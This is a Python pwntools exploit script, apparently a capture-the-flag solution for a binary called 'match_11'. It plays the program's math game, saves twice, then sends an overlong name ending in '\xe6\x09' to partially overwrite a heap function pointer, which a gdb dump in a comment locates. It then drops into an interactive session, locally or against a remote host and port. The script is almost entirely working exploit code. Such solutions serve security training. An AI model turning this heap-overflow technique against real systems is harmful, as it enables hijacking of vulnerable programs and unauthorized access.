#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

'''
gdb-peda$ x/10gx 0x603010
0x603010:       0x4141414141414141      0x0a41414141414141
0x603020:       0x0000000000000000      0x0000000000400ad4  <----- function pointer to play game
0x603030:       0x0000000000000000      0x0000000000020fd1
0x603040:       0x0000000000000000      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
gdb-peda$ 
'''
def play():
    r.sendlineafter("> ","1")
    prob = r.recvuntil(" = ",drop = True)
    ans = str(eval(prob))
    if(len(ans) > (0xf)):
        r.sendline("1")
    else:
        r.sendline("1")
        #r.sendline(str(eval(prob)))
def save():
    r.sendlineafter("> ","2")

def edit():
    r.sendlineafter("> ","3")
    name = "A" *0x18 + "\xe6\x09"
    r.send(name)
def exploit(r):
    name = "A" * 0x10
    r.sendafter("Name: ",name)
    for i in range(100):
        play()
    save()
    save()
    edit()
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_11"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x400E4D",
            "b *0x400DDA",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

